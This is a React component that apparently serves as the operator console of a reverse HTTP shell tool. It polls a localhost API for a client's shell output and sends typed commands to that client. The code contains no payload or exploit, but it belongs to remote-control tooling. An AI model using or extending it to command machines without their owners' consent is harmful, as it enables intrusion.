import React, { Component } from 'react'
import request from "request";

export default class ClientConsole extends Component {
    constructor(props) {
        super(props)

        // set up state variables
        this.state = {
            output: '',
            autoScroll: true
        }

        // bind functions 
        this.getCurrentOutput = this.getCurrentOutput.bind(this)
        this.recievedCurrentOutput = this.recievedCurrentOutput.bind(this)
        this.sendInput = this.sendInput.bind(this)
    }

    componentDidMount() {
        // set up timer to continually get new shell input
        this.getOutputTimer = setInterval(() => {
            this.getCurrentOutput()
        }, 1000);

        // add event listener
        var inputText = document.getElementById('currentReverseShellInput')
        inputText.addEventListener("keypress", ({ key }) => {
            if (key === "Enter") {
                this.sendInput()
            }
        })
    }

    componentWillUnmount() {
        // clear interval
        clearInterval(this.getOutputTimer)
    }

    /**
     * Gets the current output of the reverse http shell.
     */
    getCurrentOutput() {
        // get the latest shell input 
        request(
            {
                url: `https://localhost:44349/api/ReverseHttpShell/${this.props.clientId}/${true}`,
                method: 'GET'
            },
            this.recievedCurrentOutput
        )
    }

    /**
     * Updates the output state if the request was successful.
     * @param {*} error Error from request if any.
     * @param {*} response The response of the http request.
     * @param {*} body The body of the response.
     */
    recievedCurrentOutput(error, response, body) {
        // if current input request is successful then
        if (!error && response.statusCode === 200) {
            if (body.length > 0) {
                // add output to state
                this.setState(
                    {
                        output: this.state.output + body
                    })
    
                // auto scroll new 
                if (this.state.autoScroll) {
                    document.getElementById('Dummy-Div').scrollIntoView({ behavior: "smooth" })
                }
            }
        }
    }

    /**
     * Sends input to the reverse http shell.
     */
    sendInput() {
        // get input item
        var input = document.getElementById('currentReverseShellInput').value

        // put the output to the reverse shell
        fetch(`https://localhost:44349/api/ReverseHttpShell/${this.props.clientId}`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                "id": this.props.clientId,
                "input": input
            })
        })

        // clear input text
        document.getElementById('currentReverseShellInput').value = ''
    }

    render() {
        return (
            <div className='Console'>
                <strong>Client Shell</strong> <br />
                <input id='currentReverseShellInput' className='Console-Input' type="text" />
                <button onClick={this.sendInput}>Send</button> <br />
                <hr />
                <pre className="Console-Output">
                    {this.state.output}
                    <div id='Dummy-Div'></div>
                </pre>
            </div>
        )
    }
}
